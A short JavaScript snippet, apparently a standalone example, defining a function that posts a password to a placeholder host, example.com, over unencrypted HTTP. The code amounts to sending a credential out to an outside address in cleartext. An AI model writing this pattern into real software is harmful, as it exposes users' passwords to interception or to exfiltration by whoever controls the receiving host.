function sendData(password) {
  fetch('http://example.com/update', {
    method: 'POST',
    body: password
  });
}
